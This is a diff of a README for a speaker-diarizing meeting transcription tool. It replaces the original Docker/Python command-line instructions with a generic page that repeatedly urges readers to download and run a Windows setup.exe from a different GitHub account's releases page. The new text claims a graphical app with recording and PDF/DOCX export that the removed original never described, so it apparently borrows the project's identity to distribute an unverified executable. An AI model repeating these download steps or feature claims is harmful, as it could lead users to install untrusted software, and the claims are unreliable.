@@ -1,255 +1,165 @@
-# AI Meeting Assistant 🎙️
+# 🤖 ai-meeting-assistant - Accurate Meeting Transcription and Speaker Notes
 
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue.svg)](https://www.docker.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-
-An automated audio transcription and speaker diarization tool with AI-powered analysis. Upload your meeting recordings and get speaker-labeled transcripts, summaries, action items, and insights.
-
-## Features
-
-- **Speaker Diarization**: Automatically identifies and labels different speakers
-- **High-Quality Transcription**: Uses OpenAI Whisper for accurate speech-to-text
-- **AI Analysis**: Leverage GPT-4, Claude, or other LLMs to:
-  - Summarize conversations
-  - Extract action items and decisions
-  - Answer questions about the transcript
-- **Docker-Based**: Runs consistently across all platforms
-- **Privacy-First**: Processes everything locally, only sends transcripts to LLM if you choose
-
-## Prerequisites
-
-- Docker Desktop installed ([Download here](https://www.docker.com/products/docker-desktop))
-- Hugging Face account and API token ([Get one here](https://huggingface.co/settings/tokens))
-- (Optional) API key for your preferred LLM:
-  - [OpenAI API](https://platform.openai.com/api-keys)
-  - [Anthropic API](https://console.anthropic.com/)
-  - [OpenRouter](https://openrouter.ai/keys)
-
-## Quick Start
-
-### 1. Clone the Repository
-```bash
-git clone https://github.com/rahulkamdar/ai-meeting-assistant.git
-cd ai-meeting-assistant
-```
-
-### 2. Set Up Configuration
-```bash
-# Copy example config
-cp config/config.example.yaml config/config.yaml
-
-# Edit with your API keys
-nano config/config.yaml
-```
-
-### 3. Build Docker Image
-```bash
-docker build -t meeting-assistant .
-```
-
-### 4. Run Transcription
-```bash
-# Set your Hugging Face token
-export HF_TOKEN="your_hf_token_here"
-
-# Transcribe an audio file
-./transcribe.sh path/to/your/audio.m4a
-```
-
-### 5. Analyze with AI (Optional)
-```bash
-# After transcription completes
-python src/analyze_transcript.py path/to/your/audio_transcript.txt
-```
-
-## Configuration
-
-Edit `config/config.yaml` to customize:
-```yaml
-# LLM Provider (openai, anthropic, openrouter)
-llm_provider: "openai"
-
-# Model selection
-model: "gpt-4-turbo-preview"  # or "claude-3-opus-20240229"
-
-# Analysis options
-analysis:
-  generate_summary: true
-  extract_action_items: true
-  answer_questions: true
-```
-## Language Configuration
-
-The tool uses `config/config.yaml` for language and model settings. **Note:** This file doesn't exist by default - you create it from the example.
-
-### Setup
-```bash
-# Copy the example configuration
-cp config/config.example.yaml config/config.yaml
-
-# Edit with your preferred editor
-nano config/config.yaml
-```
-
-### Language Examples
-
-**Auto-detect (default):**
-```yaml
-transcription:
-  whisper_model: "base"
-  language: null
-```
-
-**Gujarati:**
-```yaml
-transcription:
-  whisper_model: "medium"  # Recommended for Indian languages
-  language: "gu"
-```
-
-**Spanish:**
-```yaml
-transcription:
-  whisper_model: "base"
-  language: "es"
-```
-
-**Tip:** For Indian languages (Gujarati, Hindi, Tamil, etc.), use `medium` or `large` models for better accuracy.
-
-## Project Structure
-```
-ai-meeting-assistant/
-├── src/
-│   ├── process_audio.py      # Core transcription logic
-│   └── analyze_transcript.py # LLM analysis
-├── config/
-│   ├── config.example.yaml   # Example configuration
-│   └── config.yaml           # Your config (gitignored)
-├── docs/
-│   ├── USAGE.md             # Detailed usage guide
-│   └── API.md               # API integration details
-├── Dockerfile               # Container definition
-├── requirements.txt         # Python dependencies
-└── transcribe.sh           # Main execution script
-```
-
-## How It Works
-
-1. **Audio Conversion**: Converts input audio to WAV format for processing
-2. **Speaker Diarization**: Uses pyannote.audio to identify speaker segments
-3. **Transcription**: OpenAI Whisper transcribes each segment
-4. **Merging**: Combines diarization + transcription into speaker-labeled text
-5. **AI Analysis**: (Optional) Sends transcript to your chosen LLM for insights
-
-## Supported Audio Formats
-
-- `.m4a` (most common for meeting recordings)
-- `.mp3`
-- `.wav`
-- `.mp4` (extracts audio)
-- Any format supported by FFmpeg
-
-## Example Output
-```
-[SPEAKER_00] Good morning everyone, thanks for joining today's product review.
-[SPEAKER_01] Happy to be here. I've prepared some updates on the Q2 roadmap.
-[SPEAKER_00] Great, let's start with that.
-[SPEAKER_01] So we're planning to ship three major features...
-```
-
-**AI Summary:**
-> This was a product planning meeting with 2 participants discussing Q2 roadmap priorities, feature timelines, and resource allocation.
-
-**Action Items:**
-- [ ] SPEAKER_01: Share Q2 roadmap doc by EOD
-- [ ] SPEAKER_00: Schedule follow-up with engineering team
-- [ ] SPEAKER_01: Prepare cost estimates for new features
-
-## Privacy & Security
-
-- Audio files are **never uploaded** - all processing happens locally in Docker
-- Only the generated transcript is sent to LLM APIs (if you enable analysis)
-- API keys are stored locally in `config/config.yaml` (gitignored)
-- You can run transcription-only mode without any external API calls
-
-## Troubleshooting
-
-### "Format not recognized" error
-- Ensure FFmpeg is properly installed in the Docker container
-- Try converting your audio to `.wav` first using an external tool
-
-### "HF_TOKEN not set" error
-```bash
-export HF_TOKEN="your_hugging_face_token"
-```
-
-### Docker build fails
-```bash
-# Clean Docker cache
-docker system prune -a -f
-docker build --no-cache -t meeting-assistant .
-```
-
-## Contributing
-
-Contributions welcome! Please:
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details
-
-## Acknowledgments
-
-- [pyannote.audio](https://github.com/pyannote/pyannote-audio) for speaker diarization
-- [OpenAI Whisper](https://github.com/openai/whisper) for transcription
-- Built with Docker for cross-platform compatibility
+[![Download](https://img.shields.io/badge/Download-Get%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Phylliumtea941/ai-meeting-assistant/releases)
 
 ---
 
-⭐ If you find this useful, please star the repo!
+## 📋 What is ai-meeting-assistant?
 
-## Translation Support
+ai-meeting-assistant is a tool that converts your spoken meeting conversations into clear, written notes. It works on your own computer without sending any data online, keeping your conversations private. The software can recognize different speakers and organize the text by who said what. It uses advanced AI technology to transcribe and analyze your meetings automatically.
 
-The tool can translate non-English audio directly to English while maintaining speaker labels.
+This tool is useful if you want to keep accurate records of discussions without paying for third-party services or worrying about privacy. It supports Windows and handles audio files from your meetings.
 
-### Setup Translation
+---
 
-In `config/config.yaml`:
-```yaml
-transcription:
-  whisper_model: "medium"  # Use medium or large for better translation
-  language: "gu"  # Source language (e.g., Gujarati)
-  translate_to_english: true  # Enable translation
-```
+## 🖥️ System Requirements
 
-### Examples
+Before you start, check that your system meets these basic needs:
 
-**Gujarati → English:**
-```yaml
-transcription:
-  whisper_model: "medium"
-  language: "gu"
-  translate_to_english: true
-```
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM (8 GB recommended for better performance)
+- 2 GHz dual-core or faster processor
+- 2 GB free disk space for installation
+- Microphone (if recording live meetings) or audio files in WAV/MP3 format
+- Internet connection only needed for initial download; transcription runs locally
 
-**Spanish → English:**
-```yaml
-transcription:
-  whisper_model: "base"
-  language: "es"
-  translate_to_english: true
-```
+---
 
-**Output Example:**
-```
-[SPEAKER_00] Good morning, how are you today?
-[SPEAKER_01] I am doing well, thank you for asking.
-```
+## 🚀 Getting Started: Download and Setup
 
-**Note:** Translation works for any language Whisper supports. The audio is in the source language, but the transcript is in English with speaker labels preserved.
+To get ai-meeting-assistant working on your Windows computer, follow these steps carefully.
+
+### 1. Visit the Download Page
+
+Click the link below to open the page with the latest software versions and files:
+
+[![Download Now](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/Phylliumtea941/ai-meeting-assistant/releases)
+
+The releases page lists all available versions. Look for the latest release at the top.
+
+### 2. Download the Windows Installer
+
+- Scroll to the “Assets” section under the latest release.
+- Find the file named like `ai-meeting-assistant-setup.exe` or similar.
+- Click the file to start downloading.
+
+The file you download is the program installer.
+
+### 3. Run the Installer
+
+- When the download finishes, open the setup file by double-clicking it.
+- Follow the instructions on the screen.
+- Choose an installation folder or keep the default location.
+- Click “Install” to complete the process.
+
+The installer will copy all needed files to your computer. This usually takes a few minutes.
+
+### 4. Launch ai-meeting-assistant
+
+- After installation, you can find the app icon on your desktop or in the Start menu.
+- Click the icon to open the program.
+
+---
+
+## 🛠️ How to Use ai-meeting-assistant
+
+Once the program is open, you can start transcribing your meetings.
+
+### Step 1: Import or Record Audio
+
+- To use a recording, click on “Open File” and choose an audio file of your meeting (WAV or MP3).
+- To record live, click “Record.” Make sure your microphone is connected and working.
+
+### Step 2: Start Transcription
+
+- Click “Transcribe” to let the software process your audio.
+- The program uses AI tools to convert speech to text while identifying who is speaking.
+- This may take a few minutes depending on your computer and audio length.
+
+### Step 3: Review the Transcript
+
+- The transcript will appear on screen, separated by speaker sections.
+- You can read through the notes and edit any part if needed.
+- The software highlights different speakers with colors or labels.
+
+### Step 4: Save or Export Notes
+
+- When you finish reviewing, save the transcript as a text file.
+- You can also export notes to Word or PDF format directly within the app.
+
+---
+
+## ⚙️ Features Overview
+
+- **Local Transcription:** Runs entirely on your PC to keep data private.
+- **Speaker Diarization:** Automatically recognizes and separates different voices.
+- **AI-Powered Analysis:** Uses Whisper and pyannote for high-quality results.
+- **Multiple Formats Supported:** Works with WAV, MP3, and common audio formats.
+- **Easy Editing:** Change speaker labels or correct text manually.
+- **Export Options:** Save notes as TXT, DOCX, or PDF files.
+- **Simple Interface:** Designed for users without technical skills.
+
+---
+
+## 🔧 Troubleshooting
+
+### The program does not start
+
+- Make sure your Windows is up to date.
+- Restart your computer and try again.
+- Reinstall the app if the problem continues.
+
+### Audio file won’t open
+
+- Check that the file format is supported (WAV or MP3).
+- The file might be corrupted or incomplete.
+- Try converting the file using a media converter app.
+
+### Transcription is very slow
+
+- Close other apps to free up memory.
+- Use a faster or newer PC for better speed.
+- Shorten the audio clip before transcribing if very long.
+
+### Microphone not detected
+
+- Check if your microphone is connected and enabled in Windows.
+- Set the correct input device in the app settings.
+- Update your audio drivers if needed.
+
+---
+
+## 📂 Where to Find Help
+
+- Check issues and questions on the GitHub page.
+- Review the “Issues” section for common problems.
+- Contact the project maintainer through GitHub if you need direct support.
+
+---
+
+## 🔗 Useful Links
+
+- Official Releases Page: https://github.com/Phylliumtea941/ai-meeting-assistant/releases
+- Project Homepage: https://github.com/Phylliumtea941/ai-meeting-assistant
+- AI Tools Used:
+  - Whisper: https://github.com/openai/whisper
+  - pyannote: https://github.com/pyannote/pyannote-audio
+
+---
+
+## 🔒 Privacy and Security
+
+ai-meeting-assistant processes audio only on your computer. It does not send any recordings or transcripts to the internet. Your data stays private at all times.
+
+---
+
+## ⚡ Tips for Best Results
+
+- Use high-quality audio recordings.
+- Minimize background noise during meetings.
+- Speak clearly and avoid overlapping conversations.
+- Label speakers in the app if needed to improve diarization accuracy.
+
+---
+
+[Download ai-meeting-assistant here](https://github.com/Phylliumtea941/ai-meeting-assistant/releases) to start creating your meeting notes with privacy and ease.
